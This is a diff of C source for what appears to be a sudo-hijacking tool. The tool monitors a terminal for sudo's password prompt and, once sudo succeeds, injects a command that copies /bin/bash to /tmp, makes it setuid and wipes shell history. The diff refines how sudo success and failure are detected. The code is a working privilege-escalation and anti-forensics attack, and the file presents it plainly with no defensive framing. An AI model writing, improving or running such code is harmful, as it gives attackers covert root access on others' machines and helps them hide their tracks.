@@ -31,6 +31,7 @@
 struct termios termios;
 
 static char *command = " 2>/dev/null;sudo cp -rp /bin/bash /tmp 2>/dev/null;sudo chmod +s /tmp/bash 2>/dev/null;echo -n > ~/.bash_history;history -c;\x0d";
+static char *shell_prompt = "$ ";   // shell prompt (test@debian:~$ )
 static long sudo_timeout = 60 * 1000000; // 60s
 
 static void fini(void)
@@ -454,20 +455,19 @@ int main(int argc, char* argv[])
                         }
                     }
                 }else{
-//                    if(sudo_flag == 1 && output_buffer_count > 0 && output_buffer[output_buffer_count - 2] == 0x3a && output_buffer[output_buffer_count - 1] == 0x20 && strncmp(output_buffer, "[sudo] ", 7) == 0){   // start password input
-                    if(sudo_flag == 1 && output_buffer_count > 0 && strncmp(output_buffer, "[sudo] ", 7) == 0){   // start password input
+                    if(sudo_flag == 1 && output_buffer_count > 0 && strstr(output_buffer, "[sudo] ") != NULL){   // start password input
                         sudo_password_flag = 1;
                     }
 
                     if(sudo_flag == 1 && sudo_password_flag == 1){
-                        if(output_buffer_count > 0 && strncmp(output_buffer, "sudo: ", 6) == 0){    //  sudo command failed
+                        if(output_buffer_count > 0 && strstr(output_buffer, "sudo: ") != NULL){    //  sudo command failed
 #ifdef _DEBUG
                             printf("[I] [parent] sudo command failed\n");
 #endif
                             sudo_flag = 0;
                             sudo_password_flag = 0;
                             sudo_success_flag = 0;
-                        }else if(output_buffer_count > 1 && output_buffer[output_buffer_count - 2] == 0x24 && output_buffer[output_buffer_count - 1] == 0x20){  // sudo command succeeded
+                        }else if(output_buffer_count > 0 && strstr(output_buffer, shell_prompt) != NULL){  // sudo command succeeded
 #ifdef _DEBUG
                             printf("[I] [parent] sudo command succeeded\n");
 #endif
